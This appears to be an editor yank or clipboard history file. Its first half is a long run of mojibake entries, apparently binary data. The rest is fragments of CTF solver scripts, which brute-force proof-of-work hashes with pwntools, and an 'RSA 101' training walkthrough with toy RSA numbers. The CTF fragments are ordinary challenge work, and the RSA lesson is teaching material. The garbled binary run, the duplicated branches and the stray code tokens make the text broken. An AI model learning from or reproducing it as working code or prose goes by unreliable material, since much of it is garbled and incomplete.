	 ÔøΩE ÔøΩ#√§¬ß√ô√¨√©ÔøΩn1‚Ä¶
90d56844b41eb5f1f7fe6ac21da76f97|untitled:1|138|13|v|
	 #D¬¨ÔøΩ√ô√≠4a¬æ"√£¬ø√ò‚Ä¶
345ac4810a8a27426667665758d9223b|untitled:1|138|13|v|
	 ¬ø¬´√ì√µz>ÔøΩ¬Ø√¢√ü√çÔøΩJ‚Ä¶
2d38f48acfc26fd70fa67ced879e45ab|untitled:1|138|13|v|
	 √ª'L@¬ªÔøΩ0√¢¬∞¬∏¬ΩÔøΩÔøΩ‚Ä¶
17e12660c30a66f153381e229216fbe3|untitled:1|138|13|v|
	 ld√Ñ^vrÔøΩ8√æ¬™ÔøΩ √à‚Ä¶
6056a1f9c450607a390a6bf219c0fc7e|untitled:1|138|13|v|
	 √µty√ås√±i6ÔøΩÔøΩF√π√è‚Ä¶
677801a4ed43a2d30cd92ed74ce36ab3|untitled:1|138|13|v|
	 √Ç¬∑√Æ√™√≥ÔøΩ.√üÔøΩ¬ßÔøΩÔøΩ|‚Ä¶
c9beb68ce7ae0793966a286e5b6e8aae|untitled:1|138|13|v|
	 3{ÔøΩ√Ç√•{¬°f¬°√êÔøΩÔøΩ¬¥‚Ä¶
109837273e8efd5477b6358831e267d2|untitled:1|138|13|v|
	 √§√°I√æ√π√≥¬∑n√ôN√ÖÔøΩ√±‚Ä¶
74e6b366826957c6837f7ff169fd3c0f|untitled:1|138|13|v|
	 √ª¬Ω√µ¬∂p<ÔøΩ√è√ß√´ÔøΩ√úz‚Ä¶
a8a8e39ca7d201dc91d85d482f57812c|untitled:1|138|13|v|
	 √ª&ÔøΩ√øcÔøΩ√¶ÔøΩÔøΩ√£ÔøΩaÔøΩ‚Ä¶
4dcc56ff96bbd7d96d5e9c1de0e930d7|untitled:1|138|13|v|
	 MÔøΩ¬∫7ÔøΩh√ûÔøΩrÔøΩ¬£√£ÔøΩ‚Ä¶
fa35a87dd6d45074ec7995ce22cf658b|untitled:1|138|13|v|
	 √∑√Ö(-6D>ÔøΩO√ò√í√ù√Ü‚Ä¶
98c0906f8106aaaed7fc5154086df47f|untitled:1|138|13|v|
	 ÔøΩhÔøΩ√ùEt¬°√üÔøΩ√äe_3‚Ä¶
6dc0e6aa173d914a965aff9506df09d9|untitled:1|138|13|v|
	 ÔøΩÔøΩ*¬¨1ÔøΩ¬Ø√∑ÔøΩAÔøΩÔøΩ¬£‚Ä¶
c1279c8918c5cd897cdf84c18e5cdc24|untitled:1|138|13|v|
	 m√ó√ΩW¬≠√ó√µÔøΩ√í√ùk!1‚Ä¶
9a37e7720c9eeb5abc7d6529b8bd523f|untitled:1|138|13|v|
	 ÔøΩk¬µ√´ÔøΩÔøΩ¬¥ÔøΩ√å¬±ÔøΩÔøΩ#‚Ä¶
ed0b53da9ba9557114109333d5d7e534|untitled:1|138|13|v|
	 ÔøΩ√¨E2WÔøΩ√ìj&√Å"√π√Æ‚Ä¶
f6b5406e14ed41cc1b11faed1359a2c8|untitled:1|138|13|v|
	 T¬±√ä*BF¬æ√§¬¥ÔøΩ¬∫ √î‚Ä¶
c587f1f4733df0a0dac898b3377e42e0|untitled:1|138|13|v|
	 J¬æ?¬∞√Å√ß%nMu√≠UW‚Ä¶
2edd2a9c3b16a22377bd996c0cfb7f10|untitled:1|138|13|v|
	 ÔøΩeÔøΩ√îÔøΩ√àÔøΩ¬†|P[¬∏√ö‚Ä¶
164de7b834ee81eecb009a91cba0bd1a|untitled:1|138|13|v|
	 ÔøΩkxÔøΩ√ãQ√¨jW:`√°ÔøΩ‚Ä¶
7679e8012d9bfcfcbcb1ab4a9a3015e0|untitled:1|138|13|v|
	 k¬≤√•zÔøΩ¬°?¬∫¬≤√™√ëb√º‚Ä¶
432ba703ed2f16b69c835017756d7a30|untitled:1|138|13|v|
	 uZ¬ß4√µ√öÔøΩ√¢ÔøΩ√¥¬ΩÔøΩ#‚Ä¶
b9be1d2cf5016ec771e934e4677d05a4|untitled:1|138|13|v|
	 EÔøΩ¬≤] √èg√ÇÔøΩÔøΩÔøΩ!ÔøΩ‚Ä¶
134295b3a34ec6035907c41dc1b5ffcf|untitled:1|138|13|v|
	 √¥#ÔøΩ\¬¶ÔøΩÔøΩ¬∞√†bÔøΩgÔøΩ‚Ä¶
df89f832ea93a33061d9511db1f41dc2|untitled:1|138|13|v|
	 ÔøΩAÔøΩ<ÔøΩ√ú√∏W¬†¬¢¬®ÔøΩn‚Ä¶
3227e5bb2dcd58432882fb944ca672d1|untitled:1|138|13|v|
	 √Ç√≠√§√î√ï¬¶:5√µ√çÔøΩUW‚Ä¶
7e3cb68ea5f138c998d8aa9974973fad|untitled:1|138|13|v|
	 ÔøΩ7J¬∞zXR5√æ¬¥ÔøΩIi‚Ä¶
0b99637b1d7d16c01fa2bf951ff03bb8|untitled:1|138|13|v|
	 :√™¬ΩN√¨ÔøΩ√ê9$√Æ¬µ√£ÔøΩ‚Ä¶
aa8dbcb29a8afd7c068a9853a47d737f|untitled:1|138|13|v|
	 √±¬¢√îÔøΩ√≥[√ê√®u√êÔøΩÔøΩt‚Ä¶
0f5d050b05ec017c3299acc179d85905|untitled:1|138|13|v|
	 √î=√ß¬°d√ãÔøΩÔøΩ√Ö√äFÔøΩ¬Æ‚Ä¶
688ffe30136fbda8fc36f988a7eef47f|untitled:1|138|13|v|
	 √öÔøΩLMcÔøΩhÔøΩkFh√•¬≤‚Ä¶
bdd8f412eda37a06347edb7a0540a36d|untitled:1|138|13|v|
	 uÔøΩ)¬¶√≤√•dÔøΩ¬≥ÔøΩ√¥¬Ω(‚Ä¶
e816824bd173341aac1dc9579cde1ffa|untitled:1|138|13|v|
	 ÔøΩ√ø4hÔøΩ¬•?√≤p√ÑP√≠ÔøΩ‚Ä¶
9d2626955abb75ce7c95b352efa6892c|untitled:1|138|13|v|
	 √ÑHÔøΩ¬™¬©oÔøΩR|#¬±xO‚Ä¶
d7f77807e8a18c935db88ed8af1ba7ae|untitled:1|138|13|v|
	 $[¬≠ÔøΩXÔøΩ√§¬†j√†ÔøΩÔøΩJ‚Ä¶
b02a24c429df887dd5173f3560b2f74a|untitled:1|138|13|v|
	 ÔøΩ√ùnÔøΩZ√¨¬©p√å¬∞nÔøΩ¬¶‚Ä¶
70afda5db5e1dd72f13b9641ef89e8f8|untitled:1|138|13|v|
	 √†qCU√ª√ó√ê√ö√´P¬ß6√ô‚Ä¶
dd62a274a4fa196aac80c557223a96ad|untitled:1|138|13|v|
	 ÔøΩ√ÆÔøΩÔøΩÔøΩT√ïÔøΩ¬≠\¬∂ÔøΩ√∑‚Ä¶
3ff4d71f4eda63413b0b3dbcc8f93de8|untitled:1|138|13|v|
	 ¬±ÔøΩ√ê√õÔøΩ/4√¶~√∞ÔøΩ√É[‚Ä¶
c7d950afb95d4d57805e947738c4afa0|untitled:1|138|13|v|
	 ÔøΩ`p√ΩÔøΩHÔøΩ¬πUÔøΩÔøΩ]¬æ‚Ä¶
b559fbea297be7cce1a25946fda1648d|untitled:1|138|13|v|
	 ÔøΩZÔøΩAÔøΩ√≠~xÔøΩÔøΩ√∞ÔøΩh‚Ä¶
5628dfcc124001694463ecd428c03e42|untitled:1|138|13|v|
	 ÔøΩ7ÔøΩ+v~ÔøΩKÔøΩ√ù√¶ÔøΩ¬†‚Ä¶
80022930bb9c6cb84dcbcfcf809135ce|untitled:1|138|13|v|
	 √ü¬∫√Æ√üÔøΩÔøΩ√è√ê√ó√Æ!M}‚Ä¶
5debb5822f9dbfa8530d174f026d69cd|untitled:1|138|13|v|
	 'TÔøΩ7F¬´ÔøΩ√∞,√ód√≥B‚Ä¶
8bb5d1cbe3fd5a1e896bc063b70d4346|untitled:1|138|13|v|
	 √ñ^ÔøΩÔøΩ¬¢MÔøΩ¬≤ÔøΩ¬º.oÔøΩ‚Ä¶
caf18ca7e4f25108abaccdd8b9b920b9|untitled:1|138|13|v|
	 ^ÔøΩÔøΩÔøΩXIÔøΩÔøΩ√ì√±x¬æ¬ß‚Ä¶
812a6b40b3e76b2ada3847aae7e37f6f|untitled:1|138|13|v|
	 C2√±√∂√ë¬™¬∫ÔøΩÔøΩÔøΩ=v¬¢‚Ä¶
bac9b248f294f92f8b558e85b1257bb1|untitled:1|138|13|v|
	 _√±_√à√å√Ñz=√ó<¬´ÔøΩ¬¢‚Ä¶
d08a919805f37c0c7da6beec894256e6|untitled:1|138|13|v|
	 √∂ ÔøΩ¬†ÔøΩz√ã¬´ÔøΩÔøΩÔøΩ√©S‚Ä¶
97a878a11218eb46d994b94b3348fc18|untitled:1|138|13|v|
	 ÔøΩ¬®√ìÔøΩÔøΩ¬Ø0¬•√ß[√ëA]‚Ä¶
6dc3c7d795885fe868decabae457d2a5|untitled:1|138|13|v|
	 ÔøΩ√ôÔøΩ√π√∂¬ª√ï√∑√Ö^U√¥√û‚Ä¶
5fbdc026c76d2fcec05bf97c8d6afe4f|untitled:1|138|13|v|
	 ÔøΩÔøΩÔøΩÔøΩ<√îÔøΩ9√ïÔøΩ~√§¬Ø‚Ä¶
d58a343aa45a2d029d9866f330a922f8|untitled:1|138|13|v|
	 +R¬ΩN√©ÔøΩ&^√ß√õgÔøΩd‚Ä¶
fee78fa3a1e64638c99c4292bf1e0f7e|untitled:1|138|13|v|
	 ¬§¬∫}√ûÔøΩ√∏√ò√±I√∑√Çb2‚Ä¶
ec3d91713a79734e92b428939bab87c1|untitled:1|138|13|v|
	 ÔøΩ√≤W√∏CÔøΩ√´ ÔøΩ√®bÔøΩ.‚Ä¶
621be744274543441294417a2fd10db5|untitled:1|138|13|v|
	 !nU\ÔøΩHdÔøΩ√É<Eh√í‚Ä¶
05b558d1ad516428869817c1d2a6c505|untitled:1|138|13|v|
	 √âÔøΩ[√±H√¢√´$¬™$√ô√≤F‚Ä¶
a12bd4db0aab652d06792404d2eb7229|untitled:1|138|13|v|
	 √åmPÔøΩ)√ú√ùe¬∏√ØM√á7‚Ä¶
990bb1402e9fc688b6e889707b35914c|untitled:1|138|13|v|
	 ¬™f3ÔøΩ√ä√¢¬∏√ã√ïÔøΩ√™¬©√±‚Ä¶
13c0d2bae99e84a79badb0477d3bc77e|untitled:1|138|13|v|
	 iK√å]¬¥ÔøΩ√∞¬∫ÔøΩÔøΩ√ù√∂ÔøΩ‚Ä¶
b3e876d1cb04ec87256a312c0dda288a|untitled:1|138|13|v|
	 √Ω¬Ø~)$√¥ÔøΩ√Ö¬∫¬•ÔøΩ¬µ√õ‚Ä¶
978d33eaeba6dbfc4862b2dd2c9d39a4|untitled:1|138|13|v|
	 U√çV+√ô¬ø¬πD\A√ØÔøΩ√ü‚Ä¶
913c3c6e001b1c9807ae9da5ea16c883|untitled:1|138|13|v|
	 √¶ÔøΩHH8√Ç√úÔøΩt√ã[√≤√©‚Ä¶
60940c3ee935e00e90b2d1dc10636e1d|untitled:1|138|13|v|
	 ÔøΩÔøΩ!¬º<ÔøΩÔøΩFÔøΩÔøΩ√º(¬æ‚Ä¶
316c939cf73603767d6f112c2fdcf977|untitled:1|138|13|v|
	 V¬≥ÔøΩW√≤2√ª¬•~¬øAÔøΩ√†‚Ä¶
834a4f32538ed7358da3272ccc10bde5|untitled:1|138|13|v|
	 √´ÔøΩJ¬ØÔøΩuÔøΩ¬∑ÔøΩ√à¬æ¬´√µ‚Ä¶
b767473616aae498c299296146577c83|untitled:1|138|13|v|
	 ÔøΩ√ïÔøΩ√≥√¶ÔøΩN¬π'√ë√ÑÔøΩ√ï‚Ä¶
bab750127f0bbc53cd3023ca60e50fde|untitled:1|138|13|v|
	 Q√π√ãÔøΩ¬Æ√±ÔøΩ#M√®9l&‚Ä¶
ff1d289c37956c72f9e6637bc099781c|untitled:1|138|13|v|
	 √¶√™√•pÔøΩ¬ΩÔøΩÔøΩ√èÔøΩÔøΩ}¬∏‚Ä¶
1ae26ac568b52df45f39ddd9665b5a32|untitled:1|138|13|v|
	 √±ÔøΩny{&ÔøΩ¬≥ÔøΩ¬∫ÔøΩ√ãÔøΩ‚Ä¶
3eddda2cf689f1aa7be3b63e28a4c211|untitled:1|138|13|v|
	 pÔøΩ¬ª√ª√ôdpÔøΩP√≥%ÔøΩ‚Ä¶
5871f7ab6856563bfa346239526c6008|untitled:1|138|13|v|
	 √º√õ¬Ø~I¬ØÔøΩvÔøΩ√ûN√ÄÔøΩ‚Ä¶
836fbab6ae51e2b8bc0a31176b162b64|untitled:1|138|13|v|
	 ÔøΩÔøΩ√≠ÔøΩZ√ë√ú6<√É_√ª√£‚Ä¶
ccfb266e1a2b146e2e0d7e54b25312bc|untitled:1|138|13|v|
	 √øÔøΩÔøΩÔøΩO%hÔøΩÔøΩÔøΩ=√Ös‚Ä¶
f35be728bd520b45f095e316d0119f08|untitled:1|138|13|v|
	 ¬Ω√•√ùX√î-ÔøΩ4:ÔøΩ[b√≤‚Ä¶
91752752044b3bd8017e1a86ca2fd105|untitled:1|138|13|v|
	 2ÔøΩLVÔøΩÔøΩ`√¥ÔøΩ>√ÉÔøΩS‚Ä¶
d62d19f9ea841f2bd24d107e0d37033f|untitled:1|138|13|v|
	 U{ÔøΩ√∂:¬πS√¥¬∫GXÔøΩ√±‚Ä¶
c2b9278adde2144b04d7fd0b1df097b2|untitled:1|138|13|v|
	 +1√≠ÔøΩ√î√å√ñ¬Ω¬∫√úÔøΩt/‚Ä¶
a806fe26ff1162446c66c7d51ef9d7a8|untitled:1|138|13|v|
	 √™¬ß√≥¬Æ√±ÔøΩ3ÔøΩ3¬®ÔøΩ√Ω:‚Ä¶
f6fb83817374612db269552c5ec975eb|untitled:1|138|13|v|
	 ÔøΩdBR¬£2ÔøΩ2ÔøΩ√î ÔøΩ√µ‚Ä¶
b51d0803e5966023c13409f809466ea3|untitled:1|138|13|v|
	 f!ÔøΩÔøΩ√çH¬∂¬º+ÔøΩ√ú√ä√ò‚Ä¶
bb055d5126bc19563ab71bdfbfe7e35c|untitled:1|138|13|v|
	 √ØÔøΩ√ù*2√å?¬∑√æ¬Ω¬£√éÔøΩ‚Ä¶
42be90f36e2ca6342be1a94b01058305|untitled:1|138|13|v|
	 √ô√Æ¬´¬∑"√Ñ/K9ÔøΩ√ç-√ï‚Ä¶
c8e992943b291a5be912a35d9852e6d8|untitled:1|138|13|v|
	 JT:ÔøΩh√ù_√π√∂YWÔøΩ√É‚Ä¶
a43ff596a8f6782a868c960d898a1cad|untitled:1|138|13|v|
	 ¬¥ÔøΩ√µ^7√ÆÔøΩ=ÔøΩl√•ÔøΩ#‚Ä¶
1b5be2281347b7d13ffd3677090a33fd|untitled:1|138|13|v|
	 /ÔøΩ√Ü√∑¬æzÔøΩ√©zy√îN¬∑‚Ä¶
972d717d1e04f8143cc30a5238554923|untitled:1|138|13|v|
	 nÔøΩÔøΩ√ßc√ºO(√ûÔøΩt/ÔøΩ‚Ä¶
438bb12186fb5fcda740335e020db596|untitled:1|138|13|v|
	 9√öÔøΩ√ëÔøΩ@]¬∫ÔøΩ%Fz√•‚Ä¶
95108dad411e07ba52fcd6f50497e2de|untitled:1|138|13|v|
	 √∏√¶j¬∫ÔøΩ√≠ÔøΩ¬æÔøΩ√ÇB¬ª~‚Ä¶
b3dd5ef6512dba8869559341f40fac7e|untitled:1|138|13|v|
	 ÔøΩ\ÔøΩ%&,¬¨√úÔøΩÔøΩ√ì√ÉO‚Ä¶
9b685ed69696e5cfbc339cb6c0a25f74|untitled:1|138|13|v|
	 R√ñÔøΩÔøΩNÔøΩ4¬±¬ºÔøΩX¬≤¬≤‚Ä¶
a884534bab775344cf0fbde6537b5990|untitled:1|138|13|v|
	 :XG"UÔøΩÔøΩ√∂Y5ÔøΩ√≠P‚Ä¶
a6f0459c737b6d4d8d0c9a48529ecd05|untitled:1|138|13|v|
	 √òG%√øÔøΩ√™JÔøΩjSÔøΩÔøΩ=‚Ä¶
d9d9e1244ae1b1e6084ec870113fb86a|untitled:1|138|13|v|
	 ÔøΩ[sO'ÔøΩÔøΩÔøΩ%¬¢ÔøΩ√™√Ü‚Ä¶
b9cfd6a50cfd7b69ac6b355022fc5590|untitled:1|138|13|v|
	 xÔøΩ√û)ÔøΩmeÔøΩ√óR¬™¬•√ö‚Ä¶
aafc8f20db8fb1c6b9844a3d0834f4d3|untitled:1|138|13|v|
	 ¬∏ÔøΩ√ãÔøΩÔøΩÔøΩ√öÔøΩ-√Ä6√∞√î‚Ä¶
d9514b68c59aba47ce5e3234fceefd55|untitled:1|138|13|v|
	 a@√Ñ$ÔøΩ√™√∑K¬™\¬∞√è¬±‚Ä¶
cf9e3ef951aaac3d07190b0a3b7dd15e|untitled:1|138|13|v|
	 Q""√≠a√ë√ã√πÔøΩÔøΩ¬≤5¬∂‚Ä¶
ced4e8270a91bdeb74c8409a060f3c57|untitled:1|138|13|v|
	 √ûÔøΩÔøΩÔøΩ)I¬≥¬ºÔøΩ√òHe¬º‚Ä¶
24db6653619245195709962c64bf83d0|untitled:1|138|13|v|
	 √æ√ã√®√ñ√ä¬ª¬°uPÔøΩj.√†‚Ä¶
0dc572a65d13d64a75e98ce1cc53cf15|untitled:1|138|13|v|
	 ÔøΩ=ÔøΩTw√õÔøΩ-TÔøΩ√î2ÔøΩ‚Ä¶
008c7737a1772fb8bee2e83823052462|untitled:1|138|13|v|
	 √®¬¥¬§¬¢ÔøΩÔøΩcÔøΩ'ZÔøΩÔøΩÔøΩ‚Ä¶
b21767d4fe248fcc849e01a10fd12299|untitled:1|138|13|v|
	 ~ÔøΩCp¬´√∏GÔøΩK?SQd‚Ä¶
331e234b172d7bbea5a1577ca7b77e0b|untitled:1|138|13|v|
	 ÔøΩ¬∂$7√ö√êIÔøΩÔøΩ¬æ√é√ø√î‚Ä¶
be79f88def6cdc5958f1f99984654f74|untitled:1|138|13|v|
	 ¬®l/ÔøΩ*√æ√üÔøΩÔøΩÔøΩÔøΩ√¶¬ª‚Ä¶
38ef53a6d1494a6162be22c0d53b40c0|untitled:1|138|13|v|
	 ÔøΩ√ºÔøΩ#j/xÔøΩ√π√ò{E√ß‚Ä¶
3d6cdf25ec36ef7aae6a3b3a9b107c16|untitled:1|138|13|v|
	 q¬∏Q√≤√æ/¬¨?ÔøΩ√¶¬øm$‚Ä¶
b2c76287bab182c8384ff576d61e8c5e|untitled:1|138|13|v|
	 ÔøΩ"√µ√µÔøΩÔøΩ√ø{ÔøΩ√Ñ¬¶ÔøΩU‚Ä¶
4e818822f059b4793ebbb577d91cb3f7|untitled:1|138|13|v|
	 EÔøΩW√¢ÔøΩ√∫ÔøΩÔøΩ√ô√ç√äM ‚Ä¶
931b1c93b8360e44e8be151b5864cea1|untitled:1|138|13|v|
	 ÔøΩ¬´√∏ÔøΩ¬¨ÔøΩÔøΩn¬Æv¬ª√îÔøΩ‚Ä¶
dd7f55a7f32819284baca56ca20cb746|untitled:1|138|13|v|
	 Cs√ü.ÔøΩQ`√¢*a$√ú√Æ‚Ä¶
e67da36bbb4bcc5627e66b460a0adbe6|untitled:1|138|13|v|
	 8ÔøΩ√©ÔøΩ8√æWÔøΩ ¬ºÔøΩ√ø¬ø‚Ä¶
91d84928d0153867277fba4b17f30005|untitled:1|138|13|v|
	 ÔøΩ_√≤√º√è_¬∏√ÖD√ëg√ü√π‚Ä¶
c2924b56c97ba47a6c65308caf675f33|untitled:1|138|13|v|
	 \^!¬Æ +ÔøΩ√∞√£¬π¬±ÔøΩÔøΩ‚Ä¶
805be79e053903245941dfdb46bbf31a|untitled:1|138|13|v|
	 0ÔøΩ√£√Ü√ªÔøΩÔøΩa√ÆÔøΩÔøΩÔøΩÔøΩ‚Ä¶
d86970a1c9a8befee5c12444b4b522f3|untitled:1|138|13|v|
	 gÔøΩ√°√Ç√±√è0√ÉÔøΩ√£ÔøΩaÔøΩ‚Ä¶
0d9b718dbaf0581e1fe3b4fab5f5e2c8|untitled:1|138|13|v|
	 ?9√î,√öÔøΩÔøΩ¬¢¬≤    ‚Ä¶
f1f9a4958c367e21e3d418f4776b2fee|untitled:1|138|13|v|
	 √øÔøΩ3\8√æÔøΩf¬∏p√º3√å‚Ä¶
154c9ba1a79660e34169618bc3df946a|untitled:1|138|13|v|
	 √¨ÔøΩÔøΩ*ÔøΩÔøΩÔøΩ√ÇkG1¬∏-‚Ä¶
1b9ced69d572f8a6f677783aab5981ad|file:///home/neo/CTFs/hacktivitycon2020/impartial.py|7|1|V|python
	print(cands)
7d19885388ad82d3a36a361e11783f32|file:///home/neo/CTFs/hacktivitycon2020/impartial.py|16|16|V|python
	    print(first)
	    print(second)
	    print(third)
413e4166a968d3a20c64766b853f18a7|file:///home/neo/CTFs/hacktivitycon2020/impartial.py|6|1|V|python
	cands_first = [''] * 100
3c97a225af7c70dec5290b7342ae30af|file:///home/neo/CTFs/hacktivitycon2020/impartial.py|19|1|V|python
	    first_resp = r.recvline()
dcf1332ccaee06ff6a3b8d138d43d2ae|file:///home/neo/CTFs/hacktivitycon2020/impartial.py|22|1|V|python
	    print(first_resp)
c1c2dbfbea8f6ff827e5b8c030377edc|file:///home/neo/CTFs/hacktivitycon2020/impartial.py|20|1|V|python
	    first_choice = 0
0af9b0764919ee8c9e378f1cad2d72c9|file:///home/neo/CTFs/hacktivitycon2020/impartial.py|30|16|v|python
	password[first]
f3674dac40d7f25162f6ea2663e45e75|file:///home/neo/CTFs/hacktivitycon2020/impartial.py|30|37|v|python
	password[second]
70acc9371e009b258c4b5d40a84656c4|file:///home/neo/CTFs/hacktivitycon2020/impartial.py|30|59|v|python
	[third])
befa6e3ed250f6bc696eedb67b639ffa|file:///home/neo/CTFs/tctf2020/babyring/solve.py|60|1|V|python
	possible = string.ascii_letters+string.digits
	possible = list(map(''.join, it.product(possible, repeat=4)))
	pool = mp.Pool(32)
	for c in pool.imap_unordered(check, possible, chunksize=100000):
	    if c:
	        log.info('Solved - %s' % (c))
	        r.sendline(c)
	        break
fec28060367d6f1e734b1a371569983b|file:///home/neo/CTFs/hacktivitycon2020/hash.py|6|5|V|python
	    global
8350167a2e38263b3b39a6d4acba51fa|file:///home/neo/CTFs/hacktivitycon2020/hash.py|7|5|V|python
	    switch
20deb578156802fc41ff34f7b2b0b4c8|file:///home/neo/CTFs/hacktivitycon2020/hash.py|7|1|V|python
	    if hash_type == 'md5sum':
	        if hashlib.md5(tohash).hexdigest()[-6:] == target:
	            return p
c4941cbd0a396eeaae6c1397a591c52e|file:///home/neo/CTFs/hacktivitycon2020/hash.py|5|1|V|python
	def check(p, hash_type):
	    tohash = bytes(p, 'utf-8')
	    if hash_type == 'md5sum':
	        if hashlib.md5(tohash).hexdigest()[-6:] == target:
	            return p
	    if hash_type == 'md5sum':
	        if hashlib.md5(tohash).hexdigest()[-6:] == target:
	            return p
	    return None
c8f1ee9a7c5fd4b3c66d7559e99807d0|file:///home/neo/CTFs/hacktivitycon2020/hash.py|10|22|v|python
	md5sum
d334cefce45f94f9e25f6349b62f9182|file:///home/neo/CTFs/hacktivitycon2020/hash.py|7|12|v|python
	, hash_type
038ae505ae7d2f870f465e93a29a93d2|file:///home/neo/CTFs/hacktivitycon2020/hash.py|11|1|V|python
	            print('md5')
79d209cd01e5f06853c46ee212e67df2|file:///home/neo/CTFs/hacktivitycon2020/hash.py|17|9|V|python
	            print('sha1')
1ba3c6afc12437a9254181065d70152e|file:///home/neo/CTFs/hacktivitycon2020/hash.py|16|9|V|python
	        print('sha1')
7e85b4190d5a1c2a311d453f485aefdd|file:///home/neo/CTFs/hacktivitycon2020/hash.py|11|5|V|python
	    if hash_type == 'md5sum':
6b1a7654f0e7d162a42f35a71de17aea|file:///home/neo/CTFs/hacktivitycon2020/hash.py|12|5|V|python
	        print('md5')
e81bdeec001a6a0e5013ab950d69697e|file:///home/neo/CTFs/hacktivitycon2020/hash.py|32|9|V|python
	        print(r.recvline())
1c2dc35e7639f73cb383b542380b5434|file:///home/neo/CTFs/hacktivitycon2020/hash.py|33|9|V|python
	        print(r.recvline())
	        print(r.recvline())
a2de878b40db4c1006bcebacef4476f5|file:///home/neo/CTFs/hacktivitycon2020/hash.py|35|5|V|python
	    # pool.terminate()
6220a030be5f7a8c4760d3e9b4d5d9ee|file:///home/neo/cyberranges/work/rsa/rsa101.md|4|241|v|vimwiki
	lesson
7b1a2922290de6568a56a61e41034c0f|file:///home/neo/cyberranges/work/rsa/rsa101.md|105|1|V|vimwiki
	
	<h3>Further Reading</h3>
	https://en.wikipedia.org/wiki/RSA_(cryptosystem)
29e593a64a8881500dd2f1dd8b45e901|file:///home/neo/cyberranges/work/rsa/rsa101.md|41|1|V|vimwiki
	To learn more about the totient function, modular division and modular multiplicative inverses, follow the links in **Further reading**.
7d79f4f743786a4e4157884566103a72|file:///home/neo/cyberranges/work/rsa/rsa101.md|41|1|V|vimwiki
	To learn more about the totient function, modular division and modular multiplicative inverses, follow the links in **Further reading**,.
621c60479d19df2955c453355e4bd228|file:///home/neo/cyberranges/work/rsa/generate.py|2|1|^v|python
	from Crypto.Util.number import b
2b908037e9ea109ed07238105a589f35|file:///home/neo/cyberranges/work/rsa/rsa101.md|107|1|v|vimwiki
	Encoded message = 2854312398284457058259928330243763178290112970307720537957
8a5e4023b98132c5340b8ab94922a96e|file:///home/neo/cyberranges/work/rsa/rsa101.md|117|75|v|vimwiki
	try to decrypt the ciphertexts based on what you learned!
45f9cc049d924ca79c6d4260416ad1a2|file:///home/neo/cyberranges/work/rsa/generate.py|21|1|V|python
	ct = pow
570de418a7b958ea2597c6cc89368d85|file:///home/neo/cyberranges/work/rsa/rsa101.md|127|1|V|vimwiki
	n = 760204531052462416952844015351526711453087614785139558706549
ef69694d72a8ec9a2091bd257c3e186d|file:///home/neo/cyberranges/work/rsa/rsa101.md|127|1|V|vimwiki
	phi = 760204531052462416952844015349695131379508679912444810434540
bb0b54d5db8f566bfee03bc17ca92524|file:///home/neo/cyberranges/work/rsa/rsa101.md|136|1|V|vimwiki
	q = 1188188375011078791183260172737
6272588faef8c8331158c31da1a58604|file:///home/neo/cyberranges/work/rsa/rsa101.md|137|1|V|vimwiki
	phi = 916169398124173510869300400845183060291174055127746411068288
70a34854ae48725be09d3665a4357d49|file:///home/neo/cyberranges/work/rsa/rsa101.md|138|1|V|vimwiki
	d = 535859214930433480608542090196340343120394340313971885027841
0d9dbbca9eb030be336e38e592da523b|file:///home/neo/cyberranges/work/rsa/rsa101.md|138|1|V|vimwiki
	Plaintext = 566941872398387700867989622081221235
cf34caa66b3abdb7450fe86bb350bd23|file:///home/neo/cyberranges/work/rsa/rsa101.md|131|1|V|vimwiki
	p = 1088773848412886915109252084727
80e990172498f33f0872a3b5f441915a|file:///home/neo/cyberranges/work/rsa/rsa101.md|147|1|V|vimwiki
	p = 994355700551623239889154639209
	q = 671954745625916780558259261893
	n = 668162031825846272314815255388883948244303771040553057362637
3f73a6b61795d68a00cf8658f72597e1|file:///home/neo/cyberranges/work/rsa/rsa101.md|182|1|V|vimwiki
	n = 795509140647040447053519524404021640526966658442358118716121
1d677956a98400944046a5920e500732|file:///home/neo/cyberranges/work/rsa/rsa101.md|180|1|V|vimwiki
	p = 713900669106752061249304875239
acdadaa67f1b401981b9b27ea9e5da6a|file:///home/neo/cyberranges/work/rsa/rsa101.md|3|1|V|vimwiki
	<h2>Scenario Information</h2>
	RSA is one of the most popular public key cryptosystems and is used by millions of applications to safely exchange data. Chances are, you have already used RSA today without knowing it, the moment you tried to connect to a website. In this scenario, we will take a brief look at the basics of RSA.
	
	<h2>What you will learn</h2>
	- What is RSA and what are its general purposes
	- How RSA keys are generated
	- How RSA encrypts and decrypts data
	- Some useful Python libraries and commands you can use when working with RSA
	
	<h2>Scenario pre-requisites</h2>
	- Basic knowledge of what encryption is/why it is used.
	- Optional: Basic knowledge of Python
	
	<h3>Further Reading</h3>
	- https://en.wikipedia.org/wiki/RSA_(cryptosystem)
	- Modular arithmetic: https://crypto.stanford.edu/pbc/notes/numbertheory/arith.html
	- Totient function: https://crypto.stanford.edu/pbc/notes/numbertheory/units.html
	- More details about the mathematics behind RSA: https://certauth.epfl.ch/rsa/rsa.html
192d072f2415f4a7e3d450f919e2c697|file:///home/neo/cyberranges/work/rsa/rsa101.md|23|1|V|vimwiki
	<h1> RSA 101 </h1>
	
	<h2>Walkthrough</h2>
	
	<h3>Introduction</h3>
	RSA is one of the most famous and widely used public key cryptosystems. It takes its name from its creators, Rivest, Shamir and Adleman, who created RSA in 1977. It is an [asymmetric encryption](https://en.wikipedia.org/wiki/Public-key_cryptography) scheme, which means that users create a key pair to perform encryption: a public key, which can be seen by anyone, and a private key, which the user has to protect and keep secret.
	RSA has two main purposes:
	    - Public key encryption: user A shares their public key with user B, whom they want to communicate with. User B encrypts a message with A's public key and sends it back to A. A decrypts the message using their private key, and is the only person who can do so because nobody else has access to A's private key. Using public key encryption, user B can safely send a message to A and make sure that a man-in-the-middle cannot decrypt the message.
	    - Digital signatures: user A uses their private key to encrypt a message (called "signing"). Anyone who knows A's public key can decrypt the message and make sure that it was signed by A, since A is the only person with access to the private key. Digital signatures are used for verifying the authenticity of a message.
	
	In this scenario, we will mostly look at how RSA is used for public key encryption.
	
	<h3>Key generation</h3>
	To create an RSA key pair, the following process is followed:
	1. Choose two distinct prime numbers, `p` and `q`. The security of RSA depends on how large these two numbers are. For most modern cryptosystems, it is recommended that the product of `p` and `q` has a size of at least 2048 bits.
	2. Calculate `n = p * q`. N is called the **public modulus**.
	3. Calculate `phi(n) = (p - 1) * (q - 1)`. `Phi(n)` is also known as **Euler's totient function**.
	4. Choose an integer `e`, such that `1 < e < phi(n)` and `e` is coprime to `phi(n)` (`gcd(e, phi(n)) == 1`). Usually, the number 65537 (or 0x10001 in hex) is used, but any number that fits the criteria can be used. `e` and `n` are the RSA public key.
